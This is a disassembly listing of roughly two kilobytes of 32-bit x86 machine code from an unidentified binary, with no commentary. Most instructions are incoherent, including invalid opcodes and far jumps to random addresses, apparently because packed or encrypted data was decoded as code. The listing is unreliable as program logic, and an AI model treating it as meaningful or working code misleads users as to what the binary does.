  41a3af:	rcl    BYTE PTR [esp+ecx*4-0x23],0x65
  41a3b4:	shl    BYTE PTR [edi],cl
  41a3b6:	xor    eax,0xc0367f75
  41a3bb:	inc    esi
  41a3bc:	add    eax,ecx
  41a3be:	push   ds
  41a3bf:	mov    al,0xf9
  41a3c1:	push   ds
  41a3c2:	stos   DWORD PTR es:[edi],eax
  41a3c3:	dec    ecx
  41a3c4:	aas    
  41a3c5:	ds push eax
  41a3c7:	or     dh,al
  41a3c9:	mov    DWORD PTR [edx+0x3847cfe6],eax
  41a3cf:	(bad)  
  41a3d0:	xchg   esp,eax
  41a3d1:	cmp    eax,0x25ede70e
  41a3d6:	popf   
  41a3d7:	neg    DWORD PTR [eax+0x34]
  41a3da:	ror    BYTE PTR [edi],1
  41a3dc:	cmp    ecx,ebx
  41a3de:	cwde   
  41a3df:	imul   eax,edi,0xffffff91
  41a3e2:	fs ins DWORD PTR es:[edi],dx
  41a3e4:	push   edx
  41a3e5:	das    
  41a3e6:	sub    ebp,DWORD PTR [ecx+0x61]
  41a3e9:	jge    0x41a3a1
  41a3eb:	mov    edx,0xd9e9a467
  41a3f0:	mov    WORD PTR [eax],ss
  41a3f2:	or     ebx,DWORD PTR [eax-0x56f789f1]
  41a3f8:	pop    es
  41a3f9:	enter  0xe5f9,0xfc
  41a3fd:	call   0x8fbf:0xd40ae88f
  41a404:	into   
  41a405:	dec    eax
  41a406:	xor    ah,BYTE PTR [ebx]
  41a408:	aam    0xbf
  41a40a:	int3   
  41a40b:	mov    ah,0x86
  41a40d:	mov    ch,0x6
  41a40f:	pop    eax
  41a410:	fnstcw WORD PTR [ecx-0x3dcbcbb3]
  41a416:	mov    bl,BYTE PTR [ecx-0x3a1fde09]
  41a41c:	out    dx,al
  41a41d:	sub    dl,BYTE PTR [ebx-0x3645e784]
  41a423:	or     al,0x12
  41a425:	ret    
  41a426:	jmp    0x41a476
  41a428:	or     eax,0xdba6bd75
  41a42d:	xchg   bl,al
  41a42f:	ss jp  0x41a3fe
  41a432:	stos   DWORD PTR es:[edi],eax
  41a433:	(bad)  [edi+0x61]
  41a436:	leave  
  41a437:	out    0x4a,eax
  41a439:	stos   DWORD PTR es:[edi],eax
  41a43a:	neg    BYTE PTR [edx+edi*8+0x1bbd8666]
  41a441:	jnp    0x41a3d7
  41a443:	xor    al,0xff
  41a445:	inc    eax
  41a446:	test   DWORD PTR [ecx-0x42],eax
  41a449:	cli    
  41a44a:	or     eax,0xd8c56f22
  41a44f:	push   ecx
  41a450:	icebp  
  41a451:	ins    BYTE PTR es:[edi],dx
  41a452:	retf   0x271a
  41a455:	test   eax,0x3db159be
  41a45a:	mov    DWORD PTR [edi+0x3d],ebp
  41a45d:	(bad)  
  41a45f:	lods   al,BYTE PTR ds:[esi]
  41a460:	or     cl,bh
  41a462:	fcmovb st,st(7)
  41a464:	into   
  41a465:	push   ebx
  41a466:	jecxz  0x41a49b
  41a468:	out    0x8d,al
  41a46a:	mov    ecx,0x96a0d62d
  41a46f:	push   edi
  41a470:	gs icebp 
  41a472:	nop
  41a473:	push   eax
  41a474:	sbb    eax,0x174e45ce
  41a479:	nop
  41a47a:	push   edx
  41a47b:	push   ss
  41a47c:	ficom  DWORD PTR [edx+ebp*4+0x60]
  41a480:	je     0x41a413
  41a482:	cwde   
  41a483:	mov    DWORD PTR ds:0xd48677b2,ebx
  41a489:	pop    edi
  41a48a:	pop    ebp
  41a48b:	ds call 0xa109:0xcab759df
  41a493:	jb     0x36d9e863
  41a499:	adc    al,0xbd
  41a49b:	xor    ch,bl
  41a49d:	add    dh,BYTE PTR [edx]
  41a49f:	fwait
  41a4a0:	cdq    
  41a4a1:	pop    edx
  41a4a2:	icebp  
  41a4a3:	scas   eax,DWORD PTR es:[edi]
  41a4a4:	or     dh,BYTE PTR [edi-0x37]
  41a4a7:	sahf   
  41a4a8:	shl    BYTE PTR [edi],0xec
  41a4ab:	mov    ecx,DWORD PTR [edx+0x4c55e6d1]
  41a4b1:	out    dx,al
  41a4b2:	xchg   DWORD PTR [edi+0x266100f0],ecx
  41a4b8:	test   BYTE PTR [ebx],bh
  41a4ba:	shr    DWORD PTR [ecx+eiz*1],0xb8
  41a4be:	or     ecx,esi
  41a4c0:	mov    ds:0xfc73697e,eax
  41a4c5:	sbb    DWORD PTR [ebx+ebx*1-0x46],esi
  41a4c9:	test   BYTE PTR [esi],cl
  41a4cb:	bound  ecx,QWORD PTR [edi-0x7b4a169f]
  41a4d1:	mov    es,WORD PTR [edi+0x439d0ae0]
  41a4d7:	scas   eax,DWORD PTR es:[edi]
  41a4d8:	inc    ebp
  41a4d9:	lds    edi,FWORD PTR [eax-0x1ab186d0]
  41a4df:	mov    ds:0xc297c4a1,eax
  41a4e4:	xchg   edi,eax
  41a4e5:	shr    DWORD PTR [edx],cl
  41a4e7:	xchg   edi,eax
  41a4e8:	scas   al,BYTE PTR es:[edi]
  41a4e9:	mov    al,ds:0x59ac28f6
  41a4ee:	test   DWORD PTR [esi-0x74],edx
  41a4f1:	call   0xb6d0c502
  41a4f6:	xchg   DWORD PTR [eax+ecx*4],esp
  41a4f9:	daa    
  41a4fa:	(bad)
  41a4fd:	mov    bl,0xef
  41a4ff:	jmp    0x1188:0xf5b2e6d3
  41a506:	je     0x41a54d
  41a508:	enter  0xb7d1,0xb7
  41a50c:	fistp  QWORD PTR [ebx+0x747322ac]
  41a512:	sahf   
  41a513:	cmp    ah,BYTE PTR [eax-0x44]
  41a516:	mov    ebx,0x33618788
  41a51b:	gs cs fistp QWORD PTR ss:[ebx]
  41a520:	push   ebp
  41a521:	inc    eax
  41a522:	imul   ebp,DWORD PTR [eax+0x137778a7],0x6a
  41a529:	mov    ds:0x6217382a,eax
  41a52e:	inc    ebx
  41a52f:	test   bh,al
  41a531:	sbb    DWORD PTR [ecx],ebp
  41a533:	repz push ss
  41a535:	and    edx,edi
  41a537:	jmp    0x41a58d
  41a539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53a:	sub    edx,ebp
  41a53c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a53d:	and    edx,DWORD PTR [ebp-0x16]
  41a540:	or     BYTE PTR [ecx+0x3442c3a4],bl
  41a546:	push   edx
  41a547:	sub    al,0xf2
  41a549:	cmp    eax,0xf8a52f6
  41a54e:	pushf  
  41a54f:	daa    
  41a550:	add    al,0xd3
  41a552:	xor    DWORD PTR [ecx+0x5c5090ec],ebp
  41a558:	popf   
  41a559:	push   ss
  41a55a:	ficom  DWORD PTR [ecx]
  41a55c:	lods   al,BYTE PTR ds:[esi]
  41a55d:	cwd    
  41a55f:	push   ecx
  41a560:	push   0xa3ef9bc7
  41a565:	cmp    al,0x38
  41a567:	pop    esi
  41a568:	aaa    
  41a569:	adc    eax,0x7c4a9bf7
  41a56e:	mov    ebx,0xb8a3087
  41a573:	test   BYTE PTR [eax+0x48271d70],cl
  41a579:	dec    esi
  41a57a:	pop    ss
  41a57b:	pop    esp
  41a57c:	test   DWORD PTR [ecx-0x17],eax
  41a57f:	mov    esi,0xb41e3431
  41a584:	xor    eax,0xea32f4f3
  41a589:	cmp    eax,0x91694ae8
  41a58e:	ins    BYTE PTR es:[edi],dx
  41a58f:	inc    ecx
  41a590:	inc    ecx
  41a591:	repnz xchg ebx,eax
  41a593:	push   es
  41a594:	adc    dl,bl
  41a596:	dec    esi
  41a597:	stc    
  41a598:	cmp    eax,0xd6420791
  41a59d:	ret    0x12cd
  41a5a0:	stos   BYTE PTR es:[edi],al
  41a5a1:	ja     0x41a601
  41a5a3:	mov    edx,0xfd82588e
  41a5a8:	sbb    DWORD PTR [esi],ebx
  41a5aa:	rcl    cl,1
  41a5ac:	sub    al,0xd1
  41a5ae:	out    0x28,al
  41a5b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b1:	icebp  
  41a5b2:	test   eax,0xa4c8ebb1
  41a5b7:	loopne 0x41a55f
  41a5b9:	adc    bl,BYTE PTR [edi-0x22]
  41a5bc:	push   ecx
  41a5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5be:	mov    dl,0x85
  41a5c0:	fs hlt 
  41a5c2:	adc    ecx,0xcfff4315
  41a5c8:	pop    edi
  41a5c9:	int    0xe4
  41a5cb:	lods   al,BYTE PTR ds:[esi]
  41a5cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5cd:	mov    esi,0x27af48fa
  41a5d2:	add    eax,0xdf90def9
  41a5d7:	mov    ds:0xc4d90210,eax
  41a5dc:	rcl    DWORD PTR [ecx],cl
  41a5de:	or     eax,0x7880ccbc
  41a5e3:	add    eax,0xd4107cb0
  41a5e8:	aam    0xc3
  41a5ea:	cdq    
  41a5eb:	mov    esp,0x9855405e
  41a5f0:	into   
  41a5f1:	mov    eax,ds:0xd38cf846
  41a5f6:	ins    BYTE PTR es:[edi],dx
  41a5f7:	jg     0x41a667
  41a5f9:	nop
  41a5fa:	add    DWORD PTR [ecx+0x1e8b8b83],edx
  41a600:	or     eax,DWORD PTR [eax+0x15203ae2]
  41a606:	and    al,0x2f
  41a608:	fcom   DWORD PTR [ebp+0x63]
  41a60b:	add    dl,dl
  41a60d:	sbb    eax,DWORD PTR [eax-0x186c9a9e]
  41a613:	retf   0xcd4f
  41a616:	adc    BYTE PTR ds:0xf72614c4,al
  41a61c:	inc    eax
  41a61d:	jae    0x41a5ae
  41a61f:	dec    esi
  41a620:	push   ebx
  41a621:	xchg   esp,eax
  41a623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a624:	sahf   
  41a625:	hlt    
  41a626:	mov    ebx,0xf0eb5f04
  41a62b:	cmc    
  41a62c:	les    eax,FWORD PTR [eax+ebp*2+0x6b50972a]
  41a633:	int3   
  41a634:	xchg   esi,eax
  41a636:	ss xchg esi,eax
  41a638:	sbb    BYTE PTR [ebp-0x6c770980],cl
  41a63e:	imul   esp,DWORD PTR [ebp+0x73],0x5f
  41a642:	(bad)  
  41a643:	(bad)  
  41a644:	mov    edi,0xa4ab50d0
  41a649:	xor    al,0xd3
  41a64b:	enter  0xc9d5,0xfa
  41a64f:	lock sbb BYTE PTR [ebp-0x54],bl
  41a653:	sbb    bh,BYTE PTR [edi]
  41a655:	fcom   st(1)
  41a657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a659:	jmp    0x41a5fe
  41a65b:	aaa    
  41a65c:	sbb    BYTE PTR [ecx+eax*4+0x68f74a66],ch
  41a663:	push   edx
  41a664:	inc    edx
  41a665:	aaa    
  41a666:	cmp    eax,0x58bd7fe6
  41a66b:	mov    esp,0xfc51e1ca
  41a670:	or     BYTE PTR [ebx+0x7b863cb0],0x32
  41a677:	adc    DWORD PTR [edx],edi
  41a679:	std    
  41a67a:	aas    
  41a67b:	push   ecx
  41a67c:	mov    ds,WORD PTR ds:0x804623bf
  41a682:	xchg   esi,eax
  41a683:	cld    
  41a684:	into   
  41a685:	fadd   QWORD PTR [edx+0x64055dff]
  41a68b:	push   ecx
  41a68c:	scas   al,BYTE PTR es:[edi]
  41a68d:	loop   0x41a638
  41a68f:	mov    dh,0x47
  41a691:	add    eax,0x3a00f741
  41a696:	stos   DWORD PTR es:[edi],eax
  41a697:	add    al,0x49
  41a699:	cli    
  41a69a:	mov    edx,0x9b4e2c6
  41a69f:	int    0x6b
  41a6a1:	xor    ebx,edi
  41a6a3:	iret   
  41a6a4:	mov    esi,0xfeaa0005
  41a6a9:	xchg   esi,eax
  41a6aa:	push   edi
  41a6ab:	(bad)  
  41a6ac:	pop    eax
  41a6ad:	sbb    eax,0x63eb2920
  41a6b2:	dec    ecx
  41a6b3:	mov    eax,ds:0xc260227d
  41a6b8:	sub    eax,0x783dcd54
  41a6bd:	aaa    
  41a6be:	inc    esp
  41a6bf:	mov    bh,0x49
  41a6c1:	shl    BYTE PTR [ebx],0x69
  41a6c4:	cli    
  41a6c5:	retf   0xf195
  41a6c8:	pop    es
  41a6c9:	push   es
  41a6ca:	enter  0x70e3,0x0
  41a6ce:	lds    edi,FWORD PTR [ebx-0x44]
  41a6d1:	in     al,0x12
  41a6d3:	inc    esp
  41a6d4:	inc    ebx
  41a6d5:	dec    eax
  41a6d6:	cmp    al,0xd0
  41a6d8:	pop    ds
  41a6d9:	loopne 0x41a66a
  41a6db:	dec    esp
  41a6dc:	imul   ebp,DWORD PTR [edi+eiz*8-0x4d],0x874997c
  41a6e4:	imul   ebx,DWORD PTR [ebp+0x3f],0x5894f2b9
  41a6eb:	xor    dl,BYTE PTR [ecx]
  41a6ed:	add    eax,0x6cc441da
  41a6f2:	imul   eax,DWORD PTR [edx],0x91d65ef9
  41a6f8:	and    eax,0xc22eae22
  41a6fd:	inc    edi
  41a6fe:	ins    DWORD PTR es:[edi],dx
  41a6ff:	mov    ds:0xe1716417,al
  41a704:	inc    esi
  41a705:	and    ebx,eax
  41a707:	pushf  
  41a708:	or     esi,DWORD PTR ds:0x7d8bd033
  41a70e:	lock not DWORD PTR ds:0x42a36d
  41a715:	add    edx,ecx
  41a717:	cmp    edi,edx
  41a719:	mov    DWORD PTR ds:0x42a351,0x6de4
  41a723:	je     0x4229ee
  41a729:	push   ebx
  41a72a:	mov    DWORD PTR ds:0x42a2d1,0x24b5
  41a734:	jmp    0x4229c9
  41a739:	mov    edx,DWORD PTR [ebp-0x8]
  41a73c:	adc    edi,DWORD PTR ds:0x42a3ad
  41a742:	jmp    0x41ac54
  41a747:	retf   
  41a748:	rol    ah,0xc4
  41a74b:	retf   
  41a74c:	(bad)  
  41a74d:	retf   
  41a74e:	(bad)  
  41a74f:	and    edx,eax
  41a751:	adc    al,0x39
  41a753:	jno    0x41a794
  41a755:	(bad)  
  41a756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a757:	cmp    DWORD PTR [bx+0x78],0x73
  41a75c:	jl     0x41a7d6
  41a75e:	js     0x41a73d
  41a760:	cmp    esi,DWORD PTR [eax+0x7a]
  41a763:	inc    eax
  41a764:	sbb    BYTE PTR [esi+0x2130d3ea],dl
  41a76a:	jmp    0x41a7d7
  41a76c:	test   edx,esp
  41a76e:	mov    cl,0x79
  41a770:	shl    BYTE PTR [ecx-0x6875d363],cl
  41a776:	sub    esp,DWORD PTR [ebx+eiz*8]
  41a779:	ficom  WORD PTR [edx+0x60]
  41a77c:	ret    
  41a77d:	iret   
  41a77e:	int3   
  41a77f:	(bad)  
  41a780:	cld    
  41a781:	xchg   edi,eax
  41a782:	inc    edx
  41a783:	cwde   
  41a784:	inc    ebx
  41a785:	adc    eax,DWORD PTR [edi+0xdec0853]
  41a78b:	mov    DWORD PTR [eax-0x35ce56f],ebx
  41a791:	xchg   bh,dl
  41a793:	lods   al,BYTE PTR ds:[esi]
  41a794:	pop    ebp
  41a795:	cmc    
  41a796:	jmp    0x1689:0x1d3042ea
  41a79d:	push   cs
  41a79e:	int3   
  41a79f:	mov    ah,BYTE PTR [ecx+0x1b]
  41a7a2:	push   ecx
  41a7a3:	imul   esp,eax,0xfa0f7fdb
  41a7a9:	push   ecx
  41a7aa:	aaa    
  41a7ab:	loope  0x41a783
  41a7ad:	push   esi
  41a7ae:	or     esi,edi
  41a7b0:	or     BYTE PTR [edx+0x42],0x18
  41a7b4:	and    eax,0x511d515c
  41a7b9:	add    al,0xff
  41a7bb:	or     BYTE PTR [ebx+0x2e5e0939],0x2f
  41a7c2:	or     cl,BYTE PTR [ecx-0x2f]
  41a7c5:	iret   
  41a7c6:	xchg   esp,eax
  41a7c7:	out    dx,eax
  41a7c8:	adc    eax,0xe7bdd81b
  41a7cd:	cwde   
  41a7ce:	cmc    
  41a7cf:	cmp    edi,ecx
  41a7d1:	fsubr  st,st(1)
  41a7d3:	jbe    0x41a847
  41a7d5:	and    eax,0xb7225b2b
  41a7da:	jmp    0x41a85b
  41a7dc:	(bad)  
  41a7de:	sub    DWORD PTR [ebx-0xf7e9a68],esp
  41a7e4:	inc    edx
  41a7e5:	inc    eax
  41a7e6:	or     al,0x41
  41a7e8:	sti    
  41a7e9:	enter  0x3488,0xbc
  41a7ed:	mov    edx,0x2d915ea4
  41a7f2:	fs xchg edx,eax
  41a7f4:	imul   edi,edi,0x57
  41a7f7:	aam    0x5f
  41a7f9:	add    eax,0x528339ff
  41a7fe:	das    
  41a7ff:	ins    DWORD PTR es:[edi],dx
  41a800:	mov    edx,0x71404c7
  41a805:	fs xor eax,0x5ef23a69
  41a80b:	xor    BYTE PTR [ebp+0x30],dl
  41a80e:	out    dx,al
  41a80f:	jmp    0x4eb5246c
  41a814:	mov    al,ds:0x34e7f2c4
  41a819:	fyl2xp1 
  41a81b:	xchg   ebp,eax
  41a81c:	mov    cl,BYTE PTR [edx+0x693548ce]
  41a822:	sbb    edx,DWORD PTR [ecx+0x20b59bff]
  41a828:	mov    ebx,0x3bd67a87
  41a82d:	mov    DWORD PTR [ebx-0x52],ebx
  41a830:	lods   al,BYTE PTR ds:[esi]
  41a831:	mov    eax,ds:0x4d3ef327
  41a836:	sti    
  41a837:	mov    dh,BYTE PTR [eax]
  41a839:	sub    eax,0x9c00dfaa
  41a83e:	je     0x41a85c
  41a840:	dec    edi
  41a841:	(bad)  
  41a842:	cmp    DWORD PTR [eax-0xf],edx
  41a845:	inc    eax
  41a846:	or     al,0x5c
  41a848:	call   0x1cb8:0xbe748f23
  41a84f:	push   ebx
  41a850:	sub    BYTE PTR [ebp+ebp*4-0x36],bl
  41a854:	and    DWORD PTR [ecx-0x4d],ebp
  41a857:	cwde   
  41a858:	daa    
  41a859:	cli    
  41a85a:	ss push ds
  41a85c:	(bad)
  41a860:	into   
  41a861:	jb     0x41a850
  41a863:	js     0x41a8ba
  41a865:	je     0x41a836
  41a867:	push   esp
  41a868:	repnz bnd jp 0x41a81e
  41a86c:	(bad)  
  41a86d:	cmc    
  41a86e:	xchg   ebx,eax
  41a86f:	mov    al,ds:0xff52bf38
  41a874:	stos   DWORD PTR es:[edi],eax
  41a875:	(bad)  
  41a878:	pusha  
  41a879:	xchg   esi,eax
  41a87a:	out    0x8e,eax
  41a87c:	ds or  eax,0x5a79d9d5
  41a882:	outs   dx,DWORD PTR ds:[esi]
  41a883:	dec    edi
  41a884:	xor    BYTE PTR [ecx+0x35],0x9
  41a888:	add    bl,bl
  41a88a:	mov    al,al
  41a88c:	jb     0x41a859
  41a88e:	mov    dl,0xf2
  41a890:	bound  esp,QWORD PTR [esi-0x22341db]
  41a896:	leave  
  41a897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a898:	pop    esi
  41a899:	repnz gs and esp,esp
  41a89d:	fistp  WORD PTR [esi-0x55]
  41a8a0:	fisttp WORD PTR [ecx-0x37b2f9e9]
  41a8a6:	ret    0x74ec
  41a8a9:	pop    ds
  41a8aa:	dec    ebx
  41a8ab:	and    BYTE PTR [edx+esi*8],dh
  41a8ae:	dec    edx
  41a8af:	in     al,0x3e
  41a8b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b2:	cmp    BYTE PTR [ecx-0x11eaaa2],0xcc
  41a8b9:	wbinvd 
  41a8bb:	mov    fs,WORD PTR [ecx]
  41a8bd:	aaa    
  41a8be:	imul   ebx,DWORD PTR [ecx+edx*2+0x4c],0xffffff93
  41a8c3:	scas   al,BYTE PTR es:[edi]
  41a8c4:	add    al,0x1d
  41a8c6:	pop    ecx
  41a8c7:	scas   al,BYTE PTR es:[edi]
  41a8c8:	bnd ja 0x41a8d9
  41a8cb:	mov    al,ds:0xf682eaa1
  41a8d0:	mov    esi,0xa01fdf9f
  41a8d5:	pop    ds
  41a8d6:	out    0x81,al
  41a8d8:	mov    edi,0x56760ee0
  41a8dd:	sti    
  41a8de:	aam    0xf0
  41a8e0:	out    0x8a,al
  41a8e2:	loope  0x41a899
  41a8e4:	test   bh,bl
  41a8e6:	adc    ebp,DWORD PTR [ebx]
  41a8e8:	(bad)  
  41a8e9:	cmp    DWORD PTR [eax],edi
  41a8eb:	inc    esp
  41a8ec:	repnz clc 
  41a8ee:	loop   0x41a94b
  41a8f0:	mov    ebp,0x55b13b7b
  41a8f5:	ds jecxz 0x41a8a3
  41a8f8:	ins    BYTE PTR es:[edi],dx
  41a8f9:	push   ebx
  41a8fa:	jne    0x41a8cf
  41a8fc:	pop    esp
  41a8fd:	mov    ebx,0x3c8767a4
  41a902:	out    dx,eax
  41a903:	push   ebx
  41a904:	inc    esi
  41a905:	leave  
  41a906:	jbe    0x41a930
  41a908:	push   0xc4562f11
  41a90d:	test   DWORD PTR [ecx],eax
  41a90f:	neg    dl
  41a911:	jo     0x41a97c
  41a913:	xor    dh,BYTE PTR [esi]
  41a915:	or     cl,bh
  41a917:	pop    es
  41a918:	inc    edx
  41a919:	lock cmp al,0xbc
  41a91c:	mov    dl,0x4c
  41a91e:	test   eax,0x6c4dedb7
  41a923:	mov    edx,0xb50ad9ff
  41a928:	retf   0x55d4
  41a92b:	xchg   edi,eax
  41a92c:	xor    bh,BYTE PTR [ecx+0x141d9a03]
  41a932:	pop    esp
  41a933:	(bad)  
  41a934:	aaa    
  41a935:	jg     0x41a910
  41a937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a938:	dec    esi
  41a939:	push   ecx
  41a93a:	rol    BYTE PTR [ebx+0x23],0x9
  41a93e:	cmp    eax,0xedbddedf
  41a943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a944:	jnp    0x41a910
  41a946:	pop    esi
  41a947:	outs   dx,BYTE PTR ds:[esi]
  41a948:	retf   0x1a19
  41a94b:	mov    cl,0x28
  41a94d:	or     DWORD PTR [esi-0x5b804fa7],ebp
  41a953:	inc    eax
  41a954:	xchg   ecx,eax
  41a955:	addr16 cmp bl,bl
  41a958:	rol    DWORD PTR [esi+ebx*1],0xf0
  41a95c:	call   0xec1b:0x10529aa3
  41a963:	iret   
  41a964:	xchg   esi,eax
  41a965:	ins    DWORD PTR es:[edi],dx
  41a966:	rep lods eax,DWORD PTR ds:[esi]
  41a968:	pop    es
  41a969:	loope  0x41a913
  41a96b:	push   esi
  41a96c:	fild   DWORD PTR [esi-0x9]
  41a96f:	int3   
  41a970:	inc    ebp
  41a971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a972:	pop    ds
  41a973:	leave  
  41a974:	fidiv  DWORD PTR [eax+0x7a]
  41a977:	push   ecx
  41a978:	cmp    eax,0xce0dc820
  41a97d:	adc    DWORD PTR [ecx],edx
  41a97f:	xor    DWORD PTR [ebx],0xffffff87
  41a982:	jmp    0x8bf3c911
  41a987:	stos   DWORD PTR es:[edi],eax
  41a988:	add    BYTE PTR [ebx-0x16],ah
  41a98b:	test   al,0xee
  41a98d:	jg     0x41aa07
  41a98f:	jecxz  0x41a9ee
  41a991:	cmp    al,0x58
  41a993:	aas    
  41a994:	xchg   ebp,eax
  41a995:	dec    edx
  41a996:	and    eax,0x28b1a852
  41a99b:	(bad)  
  41a99d:	mov    ebx,0x56580d91
  41a9a2:	or     dl,0xa8
  41a9a5:	cli    
  41a9a6:	shr    DWORD PTR [ecx-0xe93b188],1
  41a9ac:	inc    ebp
  41a9ad:	fiadd  DWORD PTR [edx]
  41a9af:	nop
  41a9b0:	std    
  41a9b1:	je     0x41a9b4
  41a9b3:	push   ss
  41a9b4:	pop    eax
  41a9b5:	pop    es
  41a9b6:	add    al,0xad
  41a9b8:	push   edx
  41a9b9:	mov    ds:0x2541f7a,eax
  41a9be:	push   esi
  41a9bf:	out    0x60,eax
  41a9c1:	adc    dh,BYTE PTR [ebx+0x19b4b7d2]
  41a9c7:	les    ebp,FWORD PTR [ebx]
  41a9c9:	xlat   BYTE PTR ds:[ebx]
  41a9ca:	in     eax,dx
  41a9cb:	jns    0x41a9ed
  41a9cd:	jle    0x41a974
  41a9cf:	lock sbb esp,DWORD PTR fs:[eax-0x35]
  41a9d4:	push   cx
  41a9d6:	dec    edx
  41a9d7:	sar    DWORD PTR [edi+0x4c26080c],cl
  41a9dd:	jo     0x41aa0a
  41a9df:	lea    esi,[edi]
  41a9e1:	into   
  41a9e2:	cmc    
  41a9e3:	cwde   
  41a9e4:	add    DWORD PTR [eax],esi
  41a9e6:	fst    QWORD PTR [ecx+0x1b60226f]
  41a9ec:	dec    esi
  41a9ed:	arpl   WORD PTR [ebp+0x21],ax
  41a9f0:	cmp    BYTE PTR [edi],bl
  41a9f2:	popa   
  41a9f3:	jmp    0x995a1046
  41a9f8:	dec    esi
  41a9f9:	xchg   ebp,eax
  41a9fa:	(bad)  
  41a9fc:	mov    BYTE PTR [edx+0x70],0x65
  41aa00:	mov    al,0x84
  41aa02:	imul   esi,DWORD PTR [eax+eiz*8-0x2d],0x777e2bde
  41aa0a:	int    0xa1
  41aa0c:	rol    DWORD PTR [ecx],1
  41aa0e:	popa   
  41aa0f:	and    al,0x28
  41aa11:	nop
  41aa12:	mov    al,0x9d
  41aa14:	xchg   ecx,eax
  41aa15:	test   DWORD PTR [ecx],eax
  41aa17:	mov    al,al
  41aa19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa1a:	adc    edi,ebx
  41aa1c:	xor    DWORD PTR [ecx],esi
  41aa1e:	(bad)  
  41aa20:	dec    ecx
  41aa21:	adc    dl,BYTE PTR [edx+0x6a]
  41aa24:	ficom  DWORD PTR [ecx+0xc7f7cff]
  41aa2a:	test   BYTE PTR [ebp+0x2111d6fc],dh
  41aa30:	jns    0x41a9fe
  41aa32:	mov    cl,0x2e
  41aa34:	adc    al,0x50
  41aa36:	fdivr  DWORD PTR [ebx+0x7fe855d6]
  41aa3c:	fistp  QWORD PTR [edi+0x55]
  41aa3f:	stos   BYTE PTR es:[edi],al
  41aa40:	cmp    dh,BYTE PTR ds:0xc025f071
  41aa46:	cmp    DWORD PTR [edx-0x42],ebp
  41aa49:	dec    ebx
  41aa4a:	retf   
  41aa4b:	nop
  41aa4c:	data16 sbb al,0x9a
  41aa4f:	add    DWORD PTR [esi+0x13],esp
  41aa52:	cmp    eax,0x63719696
  41aa57:	lea    edi,[esi*1+0x66d3415b]
  41aa5e:	xchg   DWORD PTR [eax-0x61],edi
  41aa61:	cmp    esp,ebp
  41aa63:	mov    bl,0x1d
  41aa65:	ja     0x41aa41
  41aa67:	ret    
  41aa68:	stc    
  41aa69:	hlt    
  41aa6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa6b:	xchg   ebp,eax
  41aa6c:	jae    0x41aa59
  41aa6e:	frstor [ebx-0x6c]
  41aa71:	or     BYTE PTR [edi-0x2810b9f4],dl
  41aa77:	repz sbb bl,BYTE PTR [edx+ebx*4]
  41aa7b:	fwait
  41aa7c:	imul   eax,DWORD PTR [esi+0x1d2abbb9],0xffffff85
  41aa83:	xor    ah,BYTE PTR [edi+ebx*2]
  41aa86:	(bad)  
  41aa87:	dec    al
  41aa89:	rcl    BYTE PTR [esi-0x1895b377],1
  41aa8f:	je     0x41aab5
  41aa91:	shl    BYTE PTR [esp+ebp*1+0x8],0x25
  41aa96:	mov    al,0x5c
  41aa98:	shr    DWORD PTR [ebp+esi*4-0x1cd6e4d4],0x3f
  41aaa0:	sbb    esi,DWORD PTR [ecx]
  41aaa2:	push   esi
  41aaa3:	dec    ecx
  41aaa4:	push   ebp
  41aaa5:	test   al,0x33
  41aaa7:	pop    edx
  41aaa8:	jo     0x41aa44
  41aaaa:	add    eax,0x5c2105b0
  41aaaf:	jg     0x41aa4f
  41aab1:	xchg   DWORD PTR [eax-0x2c0da360],ebx
  41aab7:	push   es
  41aab8:	into   
  41aab9:	cmp    esp,DWORD PTR [edx+0x3a17a5d]
  41aabf:	test   eax,0xb5a9b0fe
  41aac4:	fadd   st,st(3)
  41aac6:	pop    esp
  41aac7:	push   0x38
  41aac9:	mov    ds:0x66bd632e,eax
  41aace:	out    0x6c,al
  41aad0:	loopne 0x41ab22
  41aad2:	cmp    cl,BYTE PTR [edx]
  41aad4:	(bad)  
  41aad5:	fadd   st(0),st
  41aad7:	enter  0xdda1,0x86
  41aadb:	ret    
  41aadc:	lds    edx,FWORD PTR [edi+0x70]
  41aadf:	jmp    0xa04da37a
  41aae4:	dec    ebp
  41aae5:	cs and ebp,esi
  41aae8:	fnsave [ebx+0x16]
  41aaeb:	jge    0x41ab3c
  41aaed:	rol    ebp,1
  41aaef:	daa    
  41aaf0:	or     BYTE PTR [esi],ah
  41aaf2:	repz bound ecx,QWORD PTR [edx]
  41aaf5:	mov    eax,ds:0xb4a683f2
  41aafa:	sub    dl,BYTE PTR [edi+0x7146ffd1]
  41ab00:	shl    esp,1
  41ab02:	shr    DWORD PTR [ecx-0x14c7c725],1
  41ab08:	mov    esp,0x1af79865
  41ab0d:	jns    0x41ab36
  41ab0f:	mov    fs,WORD PTR [eax]
  41ab11:	sbb    ebx,edx
  41ab13:	mov    cl,0xf9
  41ab15:	and    eax,0x1fb29ec2
  41ab1a:	push   es
  41ab1b:	lock fcom st(4)
  41ab1f:	xor    ecx,DWORD PTR [eax]
  41ab21:	mov    cs,eax
  41ab23:	mov    bh,0x33
  41ab25:	jg     0x41ab79
  41ab27:	mov    WORD PTR [eax],ss
  41ab29:	pop    ds
  41ab2a:	ret    
  41ab2b:	mov    gs,WORD PTR [ecx+0x24]
  41ab2e:	push   cs
  41ab2f:	call   0xbbb96e4b
  41ab34:	inc    esi
  41ab35:	pop    ebx
  41ab36:	pushf  
  41ab37:	jns    0x41ab94
  41ab39:	adc    cl,BYTE PTR [edx-0x7ccf44cf]
  41ab3f:	mov    eax,ds:0x55e18182
  41ab44:	jmp    0x41ab07
